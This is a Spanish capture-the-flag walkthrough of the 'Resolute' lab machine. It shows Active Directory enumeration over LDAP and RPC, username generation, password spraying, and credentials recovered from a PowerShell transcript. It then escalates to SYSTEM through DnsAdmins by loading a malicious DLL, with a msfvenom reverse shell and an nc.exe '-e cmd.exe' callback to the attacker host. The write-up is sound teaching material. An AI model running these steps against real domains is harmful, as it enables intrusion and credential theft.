smb2-time: |  date: 2021-08-11T16:46:13|_ start_date: 2021-08-11T16:08:23Service detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Wed Aug 11 25:25:25 2021 -- 1 IP address (1 host up) scanned in 173. 51 secondsPeeeerfecto, destacamos:       Puerto   Servicio   Versi√≥n         389   LDAP   LDAP    Un dominio: megabank. local.       Puerto   Servicio   Versi√≥n         445   SMB   Windows Server 2016 Standard 14393    Vemos tambi√©n el grupo de trabajo MEGABANK. Por el momento nada m√°s, ahora si empecemos a romper de toooooooooodo üïØÔ∏è ‚Ä¶ Enumeraci√≥n #‚Ä¶ Protocolo LDAP üìå: Despu√©s de probar y probar cositas hacia el DNS o hacia SMB no encontramos nada :( Sin embargo si nos enfocamos en enumerar los recursos sostenidos por el protocolo LDAP vemos varias cositas interesantes‚Ä¶ üì• ‚ÄúLDAP son las siglas de **Protocolo Ligero de Acceso a Directorio**, o en ingl√©s **Lightweight Directory Access Protocol**). Se trata de un conjunto de protocolos de licencia abierta que son utilizados para **acceder a la informaci√≥n que est√° almacenada de forma centralizada** en una red. ‚Äù profesionalreview. Muy bien, apoyados en esta gu√≠a logramos profundizar y encontrar cadenas llamativas, empezaremos a jugar con un script de nmap que busca todos los recursos servidos por el protocolo y los muestra, se llama ldap-search: ‚ù± nmap -p 389 --script  ldap-search  10. 10. 10. 169 -oN ldapSearchNos devuelve un gran output, pero ya en las primeras l√≠neas podemos extraer info para seguir jugando: # Nmap 7. 80 scan initiated Wed Aug 11 25:25:25 2021 as: nmap -p 389 --script ldap-search -oN ldapSearch 10. 10. 10. 169Nmap scan report for 10. 10. 10. 169Host is up (0. 11s latency). PORT  STATE SERVICE389/tcp open ldap| ldap-search: |  Context: DC=megabank,DC=local|   dn: DC=megabank,DC=local|     objectClass: top|     objectClass: domain|     objectClass: domainDNS|     distinguishedName: DC=megabank,DC=local. . . . . . . . . Volvemos a ver el dominio de antes (megabank. local) pero separado, lo que realmente tenemos ah√≠ es el componente del dominio (DC), que ser√≠a el objeto que toma el DNS como referencia para definir un ‚Äúnombre de espacio‚Äù (como un ‚Äúidentificador‚Äù). Esto nos sirve para jugar a enumerar ese DC, ya sea con la herramienta ldapsearch o (hay m√°s de 2 opciones claramente) con una librer√≠a de Python llamada ldap3. Empecemos con ldapsearch y despu√©s hacemos unos truquitos bonitos con Python y su librer√≠a ldap3. ‚ù± ldapsearch -h 10. 10. 10. 169 -x -b  DC=megabank,DC=local       Par√°metro   Descripci√≥n         -h   Le pasamos el servidor donde esta el protocolo LDAP       -x   Hacemos una autenticaci√≥n simple, sin contrase√±a       -b   Le indicamos cu√°l es la base de nuestra b√∫squeda   Al ejecutarlo vemos el output que obtuvimos con nmap peeeeeeero muchas cosas m√°s. Y descubrimos esto: Vemos al final varios usuarios, les muestro a Simon porque fue el primero que vi, pero hay unos cuantos, si detallamos la imagen hay dos l√≠neas interesantes:  El Common Name (CN) contiene el nombre y apellido del usuario en el formato Nombre Apellido (n√≥tese las mayus).  En el campo userPrincipalName esta el correo relacionado con ese usuario, pero tambi√©n podemos destacar su formato: nombre@megabank. local. Esto es supremamente llamativo, ya que de una enumeraci√≥n de recursos del servidor LDAP hemos encontrado usuarios relacionados con el Domain Controller megabank. local üî•  Pa leer - T√©rminos extra√±os (CN, DC, DN, etc. ) : Understanding Active Directory Services. Pues si volvemos a ejecutar la instrucci√≥n, pero filtrando con grep por cn: (si no sabes por qu√©, vuelve a la imagen de arriba) para ver √∫nicamente el nombre completo del usuario, nos damos cuenta de que la lista empieza con el usuario Ryan: ‚ù± ldapsearch -h 10. 10. 10. 169 -x -b  DC=megabank,DC=local  | grep  cn:  Po muy bien, lo que podemos hacer ahora es filtrar desde Ryan hasta (por ejemplo) 30 l√≠neas despu√©s: ‚ù± ldapsearch -h 10. 10. 10. 169 -x -b  DC=megabank,DC=local  | grep  cn:  | grep  Ryan  -A 30cn: Ryan Bertrandcn: Marko Novak. . . Ya tendr√≠amos los usuarios, quit√©mosle el cn: y guard√©moslos en un archivo: # Separamos la cadena por sus espacios y nos quedamos con la segunda posicion en adelante (`2-`)‚ù± ldapsearch -h 10. 10. 10. 169 -x -b  DC=megabank,DC=local  | grep  cn:  | grep  Ryan  -A 30 | cut -d     -f2-‚ù± ldapsearch -h 10. 10. 10. 169 -x -b  DC=megabank,DC=local  | grep  cn:  | grep  Ryan  -A 30 | cut -d     -f2- &gt; users. txt ‚ù± cat users. txt | wc -l23Hay 23 usuarios, antes de ponernos a probar fuerza bruta o cualquier otra cosa es muy importante interpretar en que entorno estamos. Si nos hemos dado cuenta estamos dentro de un directorio activo (Active Directory o AD), que de una manera muuuuuuuy resumida ayuda a administrar pol√≠ticas, credenciales, equipos y otras cositas de toooda la red.  M√°s info AD - Active Directory Que es y para qu√© sirve. Algo llamativo de los usuarios que existen en un AD son el formato en que son guardados (depende claramente de la empresa que gestiona ese AD). Tomaremos de ejemplo el usuario Carlos Carlitos y el dominio nanai: nos podemos encontrar varios ‚Äútemplates‚Äù: (Imagina con mayus tambi√©n)  c. carlitos@nanai.  ccarlitos@nanai.  Carlos@nanai.  CarlosCarlitos@nanai. Y bueno, las dem√°s formas que te puedas imaginar, esas serian las m√°s conocidas y usadas. Pero, ¬øde qu√© nos sirve esto? Bueno, muy sencillo, si en dado caso de probar el usuario carlos con tooooooodas las contrase√±as posibles, pueda que ninguna nos d√© resultado, ¬øpero nos frenamos? Pues no, jugamos por ejemplo con un usuario llamado ccarlitos o CarlosCarlitos o bueno ya me entiendes :P el estar en un entorno como AD nos abre la puerta a m√°s pruebas, ahora si sigamos‚Ä¶ Veamos r√°pidamente como obtener los mismos usuarios pero con la librer√≠a de ldap3 en Python3:  Basic Enumeration LDAP with import ldap3. Creamos el script: #!/usr/bin/python3import ldap3# Nos conectamos al servidor LDAPserver = ldap3. Server('10. 10. 10. 169', get_info = ldap3. ALL, port = 389, use_ssl = False)connection = ldap3. Connection(server)connection. bind()# Buscamos en el Domain Controller y filtramos por los objetos  persona  con atributos Common Nameconnection. search(search_base='DC=megabank,DC=local', search_filter='(&amp;(objectClass=person))', search_scope='SUBTREE', attributes='CN')# Obtenemos un array como respuestaprint(connection. entries) Listones, ya tendr√≠amos los usuarios, esto nos permite jugar de toooooooooodas las formas posibles con ellos desde el mismo programa, nuestro script final con √∫nicamente los usuarios ser√≠a este: #!/usr/bin/python3import ldap3import reserver = ldap3. Server('10. 10. 10. 169', get_info = ldap3. ALL, port = 389, use_ssl = False)connection = ldap3. Connection(server)connection. bind()connection. search(search_base='DC=megabank,DC=local', search_filter='(&amp;(objectClass=person))', search_scope='SUBTREE', attributes='CN')# Volvemos a extraer toda la data despues del `cn:` (texto que este entre varios rangos: de la 'A' a la 'Z', de la 'a' a la 'z', del '0' al '9' y espacios en blanco. users_array = re. findall(r'cn: [A-Za-z0-9\s]. +', str(connection. entries))print(users_array) Ahora nos queda jugar con ese array y generar infinidad de usuarios. ‚ñ∂Ô∏è Lindo tutorial de expresiones regulares. ‚Ä¶ Explotaci√≥n #Con ayuda de la librer√≠a ldap3 en Python y nuestra extracci√≥n de usuarios podemos crear un bucle primero para quitar cn: de cada usuario y segundo para armar el formato que queramos con respecto a cada user, este ser√≠a el resultado final de nuestro script: #!/usr/bin/python3import ldap3import reserver = ldap3. Server('10. 10. 10. 169', get_info = ldap3. ALL, port = 389, use_ssl = False)connection = ldap3. Connection(server)connection. bind()connection. search(search_base='DC=megabank,DC=local', search_filter='(&amp;(objectClass=person))', search_scope='SUBTREE', attributes='CN')users_array = re. findall(r'cn: [A-Za-z0-9\s]. +', str(connection. entries))# Creamos archivo vacio llamado `users. txt`file_users = open( users. txt ,  w )for user_with_cn in users_array:  user = user_with_cn. replace( cn:  ,  )  # Ejemplo: Ryan Bertrand  try:    # Ryan    firstname = user. split()[0]    # Bertrand    lastname = user. split()[1]    # -- Abrimos archivo para adjuntar data, no para sobreescribirla    file_users = open( users. txt ,  a )    # Ryan    file_users. write(firstname +  \n )    # ryan. bertrand    file_users. write(firstname. lower() +  .   + lastname. lower() +  \n )    # Ryan. Bertrand    file_users. write(firstname +  .   + lastname +  \n )    # Ryan@Bertrand    file_users. write(firstname +  @  + lastname +  \n )    # RyanBertrand    file_users. write(firstname + lastname +  \n )    # R. bertrand    file_users. write(firstname[0] +  .   + lastname. lower() +  \n )    # Rbertrand    file_users. write(firstname[0] + lastname. lower() +  \n )    # r. bertrand    file_users. write(firstname. lower()[0] +  .   + lastname. lower() +  \n )    # rbertrand    file_users. write(firstname. lower()[0] + lastname. lower() +  \n )  except:    passfile_users. close()Y en nuestro archivo users. txt ver√≠amos algo as√≠ con todos los usuarios: ‚ù± cat users. txt. . . Marcusmarcus. strongMarcus. StrongMarcus@StrongMarcusStrongM. strongMstrongm. strongmstrong. . . Perfect√≠simo, tendr√≠amos varias opciones de usuarios, solo nos faltar√≠a la contrase√±a, podemos probar varias cosas, inicialmente algo como que cada usuario tome su ‚Äúuser‚Äù como contrase√±a (no se sabe, la vida es muy loca :P): Nos apoyaremos en crackmapexec que puede validar r√°pidamente contra SMB si unas credenciales son v√°lidas o no: ‚ù± crackmapexec smb 10. 10. 10. 169 -u users. txt -p users. txtSMB     10. 10. 10. 169  445  RESOLUTE     [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank. local) (signing:True) (SMBv1:True)SMB     10. 10. 10. 169  445  RESOLUTE     [-] megabank. local\Ryan:Ryan STATUS_LOGON_FAILURESMB     10. 10. 10. 169  445  RESOLUTE     [-] megabank. local\Ryan:ryan. bertrand STATUS_LOGON_FAILURESMB     10. 10. 10. 169  445  RESOLUTE     [-] megabank. local\Ryan:Ryan. Bertrand STATUS_LOGON_FAILURESMB     10. 10. 10. 169  445  RESOLUTE     [-] megabank. local\Ryan:Ryan@Bertrand STATUS_LOGON_FAILURESMB     10. 10. 10. 169  445  RESOLUTE     [-] megabank. local\Ryan:RyanBertrand STATUS_LOGON_FAILURESMB     10. 10. 10. 169  445  RESOLUTE     [-] megabank. local\Ryan:R. bertrand STATUS_LOGON_FAILURESMB     10. 10. 10. 169  445  RESOLUTE     [-] megabank. local\Ryan:Rbertrand STATUS_LOGON_FAILURESMB     10. 10. 10. 169  445  RESOLUTE     [-] megabank. local\Ryan:r. bertrand STATUS_LOGON_FAILURESMB     10. 10. 10. 169  445  RESOLUTE     [-] megabank. local\Ryan:rbertrand STATUS_LOGON_FAILURESMB     10. 10. 10. 169  445  RESOLUTE     [-] megabank. local\Ryan:Marko STATUS_LOGON_FAILURESMB     10. 10. 10. 169  445  RESOLUTE     [-] megabank. local\Ryan:marko. novak STATUS_LOGON_FAILURE. . . Pero nada, ninguna es valida üòî Enumeramos con rpcclient el Domain Controller üìå: Despu√©s de agotar pruebas volvi al escaneo de puertos y record√© a rpcclient, herramienta que nos ayuda a rescatar m√°s info del controlador de dominio (en caso de no necesitar credenciales üôÉ), su uso es sencillo: ‚ù± rpcclient 10. 10. 10. 169 -U    -Nrpcclient $&gt;Perfecto, nos dej√≥ entrar sin credenciales, ahora es ver si hay algo para enumerar‚Ä¶ Intentando ver los usuarios del dominio obtenemos info, lo √∫nico que cambia con respecto a los que tenemos son los primeros: rpcclient $&gt; enumdomusersuser:[Administrator] rid:[0x1f4]user:[Guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[DefaultAccount] rid:[0x1f7]user:[ryan] rid:[0x451]. . . Si nos fijamos tambi√©n nos muestra un campo llamado rid que seria como un identificador para ese usuario, este nos sirve entre varias cosas para listar m√°s info acerca del user, como por ejemplo con Administrator: rpcclient $&gt; queryuser 0x1f4    User Name  :  Administrator    Full Name  :    Home Drive :    Dir Drive  :    Profile Path:    Logon Script:    Description :  Built-in account for administering the computer/domain    Workstations:    Comment   :    Remote Dial :    Logon Time        :   mi√©, 11 ago 2021 11:09:43 -05    Logoff Time       :   mi√©, 31 dic 1969 19:00:00 -05    Kickoff Time       :   mi√©, 31 dic 1969 19:00:00 -05    Password last set Time  :   jue, 12 ago 2021 09:46:03 -05    Password can change Time :   vie, 13 ago 2021 09:46:03 -05    Password must change Time:   mi√©, 13 sep 30828 21:48:05 -05    unknown_2[0. . 31]. . .     user_rid :   0x1f4    group_rid:   0x201    acb_info :   0x00000210    fields_present: 0x00ffffff    logon_divs:   168    bad_password_count:   0x00000000    logon_count:  0x0000003e    padding1[0. . 7]. . .     logon_hrs[0. . 21]. . . Obtenemos eso, una informaci√≥n m√°s detallada del usuario, podr√≠amos hacer a mano esto con todos los dem√°s usuarios, pero es un poco feo, lo mejor es automatizarlo, hag√°moslo r√°pidamente con ayuda de la terminal, lo primero es extraer todos los rids: Con el par√°metro -c le indicamos que ejecute un comando y no nos devuelva una sesi√≥n interactiva: ‚ù± rpcclient 10. 10. 10. 169 -U    -N -c 'enumdomusers'user:[Administrator] rid:[0x1f4]user:[Guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[DefaultAccount] rid:[0x1f7]. . . Ahora filtramos por el rid: ‚ù± rpcclient 10. 10. 10. 169 -U    -N -c 'enumdomusers' | grep -oP  rid. + rid:[0x1f4]rid:[0x1f5]. . . Separamos la cadena en dos delimitndola por el simbolo : y nos quedamos con el segundo valor: ‚ù± rpcclient 10. 10. 10. 169 -U    -N -c 'enumdomusers' | grep -oP  rid. +  | cut -d ':' -f 2[0x1f4][0x1f5]. . . Y simplemente quitamos los [] de la cadena: ‚ù± rpcclient 10. 10. 10. 169 -U    -N -c 'enumdomusers' | grep -oP  rid. +  | cut -d ':' -f 2 | tr -d '[]' Listones, al final le agregamos un archivo donde queremos guardar esos valores (. . . &gt; rids. txt) y ya tenemos los rids (: Ahora volvemos a usar rpcclient, pero con el comando queryuser y le vamos pasando los rids del archivo, primero hagamos una prueba con el usuario Administrator, ya vimos todos los campos que nos devuelve al ejecutar el comando, qued√©monos con el nombre del usuario y su descripci√≥n, ning√∫n otro campo se ve llamativo as√≠ que juguemos con esos dos: ‚ù± rpcclient 10. 10. 10. 169 -U    -N -c 'queryuser 0x1f4' -N | grep -E  User Name|Description     User Name  :  Administrator    Description :  Built-in account for administering the computer/domain‚ù± rpcclient 10. 10. 10. 169 -U    -N -c 'queryuser 0x1f4' -N | grep -E  User Name|Description  | cut -d  :  -f2-    Administrator    Built-in account for administering the computer/domain‚ù± rpcclient 10. 10. 10. 169 -U    -N -c 'queryuser 0x1f4' -N | grep -E  User Name|Description  | cut -d  :  -f2- | sed -e 's/^[[:space:]]*//'AdministratorBuilt-in account for administering the computer/domainListo, ya tenemos nuestro output deseado, juguemos con un bucle que lea cada l√≠nea del archivo y realice el mismo procedimiento pero con todos los usuarios: ‚ù± for i in $(cat rids. txt); do echo  ----------- ; rpcclient 10. 10. 10. 169 -U    -N -c  queryuser $i  -N | grep -E  User Name|Description  | cut -d  :  -f2- | sed -e 's/^[[:space:]]*//'; done ¬øYa viste algo? üòµ Efectivamente, hay una contrase√±a seteada para el usuario marko :O :o O. O Puuuuuuuuuuuess probando de nuevo con cme, pero ahora contra ‚Äúmarko‚Äù no nos dan resultado esas credenciales :( ‚ù± crackmapexec smb 10. 10. 10. 169 -u 'marko' -p 'Welcome123!'SMB     10. 10. 10. 169  445  RESOLUTE     [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank. local) (signing:True) (SMBv1:True)SMB     10. 10. 10. 169  445  RESOLUTE     [-] megabank. local\marko:Welcome123! STATUS_LOGON_FAILUREProbando contra los dem√°s servicios no es v√°lida tampoco :( peeeeeeeeeeero no nos rendimos, si recordamos hab√≠amos creado una lista de usuarios muy linda, pues volvamos a probar con cada usuario del objeto pero ahora contra esa contrase√±a: ‚ù± crackmapexec smb 10. 10. 10. 169 -u users. txt -p 'Welcome123!'. . . OPAAAAAAAAAAAAAAAAAAAAA, crackmapexec nos indica que esa contrase√±a es v√°lida contra el usuario Melanie. Recordemos que existe el servicio WinRM (que nos permite jugar con tareas administrativas) y para √©l hay una herramienta muy linda llamada evil-winrm, ella nos permite obtener una PowerShell en el sistema siempre y cuando tengamos credenciales v√°lidas, intentemos usarla: VAMOOOOOOOOOOOOO, tamos dentroooooooooooowowowowoiqwjrasdkfjkal√±d s1g4m0s‚Ä¶ ‚Ä¶ Movimiento lateral : Melanie -&gt; Ryan #Recorriendo algunas carpetas del sistema vemos una oculta en la ra√≠z: PSTranscripts: *Evil-WinRM* PS C:\&gt; ls -force  Directory: C:\Mode        LastWriteTime     Length Name----        -------------     ------ ----. . . d--h--    12/3/2019  6:32 AM        PSTranscripts. . . Su nombre es llamativo, ya que habla de scripts, entremos y veamos que hay: *Evil-WinRM* PS C:\PSTranscripts&gt; ls -force -recurse  Directory: C:\PSTranscriptsMode        LastWriteTime     Length Name----        -------------     ------ ----d--h--    12/3/2019  6:45 AM        20191203  Directory: C:\PSTranscripts\20191203Mode        LastWriteTime     Length Name----        -------------     ------ -----arh--    12/3/2019  6:45 AM      3732 PowerShell_transcript. RESOLUTE. OJuoBGhU. 20191203063201. txtUn directorio 20191203 y dentro un objeto . txt, veamos ese archivo: *Evil-WinRM* PS C:\PSTranscripts\20191203&gt; type PowerShell_transcript. RESOLUTE. OJuoBGhU. 20191203063201. txt. . . . . . **********************Command start time: 20191203063515**********************PS&gt;CommandInvocation(Invoke-Expression):  Invoke-Expression &gt;&gt; ParameterBinding(Invoke-Expression): name= Command ; value= cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4c123!. . . . . . **********************Command start time: 20191203063515**********************PS&gt;CommandInvocation(Out-String):  Out-String &gt;&gt; ParameterBinding(Out-String): name= InputObject ; value= The syntax of this command is: cmd : The syntax of this command is:At line:1 char:1+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4c123!+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+ CategoryInfo     : NotSpecified: (The syntax of this command is::String) [], RemoteException+ FullyQualifiedErrorId : NativeCommandError. . . . . . **********************Windows PowerShell transcript start. . . . . . Es un archivo que uso Ryan para registrar todo lo que escrib√≠a mientras efectuaba el mapeado del directorio \\fs01\backups en X:, hay dos cosas interesantes, que escribi√≥ mal el comando (aunque lo hubiera ejecutado bien tambi√©n tendr√≠amos lo otro curioso üòè) y que uso sus credenciales as√≠ como si nada y pues nos dej√≥ un historial to lindo.  Registrar a fichero de log la l√≠nea de comandos de PowerShell (Transcript en PowerShell). Sabemos que Ryan es un usuario del `AD, pero no si tambi√©n existe en el sistema, validemos: Listones, si existe, entonces probemos a obtener una nueva PowerShell pero ahora como √©l: OJITO, tamos dentro del sistema pero ahora como el usuario Ryan (: ‚Ä¶ Escalada de privilegios #En su escritorio hay una nota: *Evil-WinRM* PS C:\\Users\ryan\Desktop&gt; type note. txtEmail to team:- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minuteJmmmm‚Ä¶ Podemos interpretarlo como un ¬øbackup?, que da igual si cambiamos algo, ¬øen un minuto volver√° a quedar como antes? Investiguemos‚Ä¶ Despu√©s de un tiempo perdido, volv√≠ atr√°s y con un simple comando ya nos encaminamos: *Evil-WinRM* PS C:\&gt; whoami /all. . . . . . GROUP INFORMATION-----------------Group Name       Type  SID                      Attributes====================== ======= ============================================== ===============================================================. . . MEGABANK\Contractors  Group  S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled groupMEGABANK\DnsAdmins   Alias  S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group. . . Vemos que estamos en dos grupos distintos a los normales, uno de ellos con un nombre llamativo: DnsAdmins, si buscamos info sobre √©l en internet lo primero que encontramos son formas de escalar privilegios us√°ndolo üòÆ  Feature, not bug: DNSAdmin to DC compromise in one line.  DNS Admin Privesc in Active Directory (AD)(Windows).  Windows Privilege Escalation: DnsAdmins to DomainAdmin.  From DnsAdmins to SYSTEM to Domain Compromise. Antes de explotar esta locura, recorramos un poco el ‚Äúporque‚Äù del ataque‚Ä¶ Seg√∫n Shay Ber por default los controladores de dominio (DC) tambi√©n son servidores DNS, el tema es que eso expone al DC a ataques relacionados con servidores DNS :O √önicamente los usuarios que est√©n en los grupos DnsAdmins, Domain Admins, Enterprise Admins, Administrators and ENTERPRISE DOMAIN CONTROLLERS tienen acceso al control/mantenimiento/gestion/actualizaci√≥n de un servidor DNS (que como dijimos antes, usualmente son DCs). Una vez dentro se pueden administrar zonas del DNS, redireccionamiento de puertos, logs, temas de la cach√©, objetos del servidor y de registros (etc. ). Este √∫ltimo es interesante, ya que podemos escribir informaci√≥n adicional en el servidor DNS (: Listones, nosotros estamos en uno de esos grupos, espec√≠ficamente en DnsAdmins. Entonces para lograr la explotaci√≥n debemos, cargar una DLL (librer√≠a din√°mica) maliciosa en el servidor DNS (que esta siendo ejecutado como SYSTEM, ya que por lo general el servidor es un **DC). üíå ‚ÄúLas DLL (Dynamic Link Library), son fragmentos de c√≥digo que se cargan bajo demanda por parte del sistema operativo durante la ejecuci√≥n de una aplicaci√≥n. ‚Äù elladodelmal. O sea, librer√≠as que tiene por default (o no üòà) el sistema y son necesarias para ejecutar una aplicaci√≥n. En t√©rminos generales hay dos maneras de generar la DLL maliciosa, una es con ayuda de msfvenom y la otra es construir nosotros mismos las instrucciones de la DLL, vamos a hacerlo de las dos maneras, pero dejaremos la creaci√≥n manual de la DLL como aprendizaje para el final‚Ä¶ As√≠ que juguemos con msfvenom‚Ä¶ ‚Ä¶ Los pasos necesarios para la explotaci√≥n son estos (siguiendo este y este post): 1. Generamos la DLL maliciosa con msfvenom: ‚ù± msfvenom -p windows/x64/shell_reverse_tcp LHOST=10. 10. 14. 8 LPORT=4433 -f dll -o sisisi. dll‚ù± file sisisi. dll sisisi. dll: PE32+ executable (DLL) (GUI) x86-64, for MS Windows2. Nos ponemos en escucha por netcat (para recibir la petici√≥n que hace la DLL y generar la Shell): ‚ù± nc -lvp 44333. Compartimos una carpeta donde est√© la DLL generada, esto con ayuda de SMB (o responder): ‚ù± smbserver. py smbFolder $(pwd) -smb2supportLa carpeta se llama smbFolder, le pasamos la ruta actual (el resultado del comando pwd) y le damos soporte a la versi√≥n 2 de samba. 4. Ahora agregamos la DLL al servicio DNS: Validamos antes como esta el registro (se acuerdan lo que hablamos antes de que pod√≠amos escribir cositas, entre ellas registros :P) que modificaremos: *Evil-WinRM* PS C:\&gt; Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll*Evil-WinRM* PS C:\&gt; Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDllProperty ServerLevelPluginDll does not exist at path HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters\. . . . Exacto, a√∫n no lo hemos creado :P Lo creamos diciendo que la DLL a agregar esta siendo compartida en una carpeta de SMB: (Tambi√©n podr√≠amos subir la DLL al sistema y en vez de la carpeta compartida pasarle la ruta absoluta hacia ella) *Evil-WinRM* PS C:\&gt; dnscmd /config /serverlevelplugindll \\10. 10. 14. 8\smbFolder\sisisi. dllRegistry property serverlevelplugindll successfully reset. Command completed successfully. Y si ahora validamos la existencia del registro: Ya existe, peeeeerfectisimo. Como √∫ltimo paso debemos ‚Äúreiniciar‚Äù el servicio DNS para que tome los cambios. Ejecutara el servidor DNS, leer√° los registros relacionados, tomara el que llama la DLL y por lo tanto la ejecutara (: 5. Reiniciamos el servidor DNS para que ejecute nuestra DLL: Una vez iniciamos el servidor DNS nos llega la petici√≥n a nuestra carpeta compartida buscando la DLL: Si esperamos un rato pensaremos que no funciono, peeeeeeeero esperamos un ratico m√°s yyyyyyyyyyy‚Ä¶ PERO CLARO QUE SIIIIIIIII, obtenemos nuestra Reverse Shell como el usuario nt authority\system (diosito) del sistema (: veamos las flags: Y listos, eso ha sido todo por esta m√°quina ‚úàÔ∏è Si quieres ver como generar la DLL manualmente sigue conmigo e. e ‚Ä¶ Post-PrivEsc: Creamos DLL manualmente #Buscando en internet example dll dns github encontramos 2 llamativos:  https://github. com/dim0x69/dns-exe-persistance.  https://github. com/kazkansouh/DNSAdmin-DLL. Usaremos los dos para lograr la ejecuci√≥n de comandos: üÖ∞ Escalada generando DLL con dns-exe-persistance. üÖ±Ô∏è Escalada generando DLL con DNSAdmin-DLL. ‚Ä¶ Generamos la DLL usando dns-exe-persistance üìå: ‚ñ∂Ô∏è https://github. com/dim0x69/dns-exe-persistance. Revisando los post que hemos usado vemos que el siguiente tiene una estructura pr√°cticamente igual al objeto Win32Project1. cpp del primer recurso, por lo que podemos pensar que o lo hizo √©l o se guio de ah√≠ (o viceversa, el del repo se guio del post, no lo sabemos):  From DnsAdmins to SYSTEM to Domain Compromise. Nos centraremos en el primer recurso, despu√©s ser√° m√°s r√°pido usar el segundo‚Ä¶ La estructura base del DLL (creo que de cualquier DLL) es esta (exactamente igual en los dos proyectos de arriba): Bien, la parte que nos interesa (y con la que juega el creador del post) es la que esta en al archivo Win32Project1. cpp: Si nos fijamos la primera funci√≥n se llama DnsPluginInitialize, lo que nos puede indicar que eso es lo que se ejecutara una vez el plugin sea iniciado, por lo queeeeeee ah√≠ debe ir nuestra matralla. El post con el que venimos trabajando y este nos lo confirman. Listooos, apoyados de nuevo en el post vemos que implementa en esa funci√≥n la instrucci√≥n system() para que le ejecute el binario shell. cmd de la ra√≠z (que puede contener ya sea una reverse shell o lo que sea). Pues aprovechemos ese conocimiento para implementar en el archivo Win32Project1. cpp una l√≠nea con la funci√≥n system(), pero como prueba que nos haga un ping hacia nuestra m√°quina, con lo cual si obtenemos la traza, sabemos que estamos ejecutando comandos en el sistema por medio de la DLL. Nos movemos a una VM Windows, clonamos el repo, abrimos el objeto Win32Project1. sln (usar√© Visual Studio para abrir el proyecto, modificarlo y compilarlo) y nos posicionamos en el archivo Win32Project1. cpp. Ahora agregamos la l√≠nea con la instrucci√≥n system(): Lo siguiente ser√° compilar el proyecto para que nos genere el archivo . dll. Arriba cambiamos Debug por Release, le decimos que la arquitectura es de 64 bits y finalmente damos clic en Compilar y Recompilar soluci√≥n: 1&gt;Generando c√≥digo1&gt;0 of 4 functions ( 0. 0%) were compiled, the rest were copied from previous compilation. 1&gt; 0 functions were new in current compilation1&gt; 0 functions had inline decision re-evaluated but remain unchanged1&gt;Generaci√≥n de c√≥digo finalizada1&gt;Win32Project1. vcxproj -&gt; C:\dns-exe-persistance\dns-plugindll-vcpp\x64\Release\Win32Project1. dll========== Compilar: 1 correctos, 0 incorrectos, 0 actualizados, 0 omitidos ==========Peeerfecto, no hay errores y se nos gener√≥ el archivo Win32Project1. dll, as√≠ que lo siguiente es movernos la librer√≠a (DLL) a nuestro sistema para posteriormente jugar con SMB, tcpdump para estar escuchando por si llegan paquetes ICMP (recordemos que ping env√≠a ese tipo de paquetes), dnscmd para agregar el plugin y el reinicio del servidor DNS: Ejecutamos: ‚ù± file Win32Project1. dll Win32Project1. dll: PE32+ executable (DLL) (GUI) x86-64, for MS Windows‚ù± smbserver. py smbFolder $(pwd) -smb2support‚ù± tcpdump -i tun0 icmp*Evil-WinRM* PS C:\&gt; dnscmd /config /serverlevelplugindll \\10. 10. 14. 8\smbFolder\Win32Project1. dll*Evil-WinRM* PS C:\&gt; sc. exe stop dns*Evil-WinRM* PS C:\&gt; sc. exe start dns VAAAAAaaaaAAmo0000000000000oo nos llega la traza ICMP, por lo taaaaaaaaaaaaaaaaanto, el servidor DNS esta ejecutando nuestro plugin y por lo consiguiente nuestro plugin ejecuta el ping (((((: AHORAAAAAAAAAA!! Dig√°mosle que nos genere una reverse Shell, pero en lugar de pasarle el binario pas√©mosle un archivo . bat que ser√° el que contenga toooooooodos los comandos que queremos ejecutar, en nuestro caso el llamado al nc. exe o a un binario generado con msfvenom. El archivo . cpp quedar√≠a as√≠: Y en nuestro sistema creamos el objeto hola. bat con el llamado al binario nc. exe que tambi√©n estaremos compartiendo en la misma carpeta smbFolder: ‚ù± cat hola. bat\\10. 10. 14. 8\smbFolder\nc. exe 10. 10. 14. 8 4433 -e cmd. exeLo subimos a la m√°quina y nos ponemos en escucha: ‚ù± nc -lvp 4433Hacemos todo lo de antes yyyyyyyyy en nuestro listeneeeeeeeeeeeeer: Increibleeeeeeeeeeeeeee!! Cualquier comando que quisi√©ramos ejecutar lo pondr√≠amos dentro de hola. bat y ya tendr√≠amos RCE como diosito. Veamos r√°pidamente la otra manera‚Ä¶ ‚Ä¶ Generamos la DLL usando DNSAdmin-DLL üìå: ‚ñ∂Ô∏è https://github. com/kazkansouh/DNSAdmin-DLL. Este recurso es mucho m√°s sencillo, √©l simplemente busca un archivo llamado command. txt en la ruta C:\Windows\Temp, parsea su informaci√≥n y cada l√≠nea la toma como comandos que ser√°n ejecutados por la instrucci√≥n system().  Po listo, no tenemos que cambiar nada del proyecto, compilamos de la misma forma que antes y nos genera la librer√≠a DNSAdmin-DLL. dll. 1&gt;------ Operaci√≥n Recompilar todo iniciada: proyecto: DNSAdmin-DLL, configuraci√≥n: Release x64 ------1&gt;stdafx. cpp1&gt;dllmain. cpp1&gt;DNSAdmin-DLL. cpp1&gt;  Creando biblioteca C:\DNSAdmin-DLL\DNSAdmin-DLL\x64\Release\DNSAdmin-DLL. lib y objeto C:\DNSAdmin-DLL\DNSAdmin-DLL\x64\Release\DNSAdmin-DLL. exp1&gt;Generando c√≥digo1&gt;Previous IPDB not found, fall back to full compilation. 1&gt;All 4 functions were compiled because no usable IPDB/IOBJ from previous compilation was found. 1&gt;Generaci√≥n de c√≥digo finalizada1&gt;DNSAdmin-DLL. vcxproj -&gt; 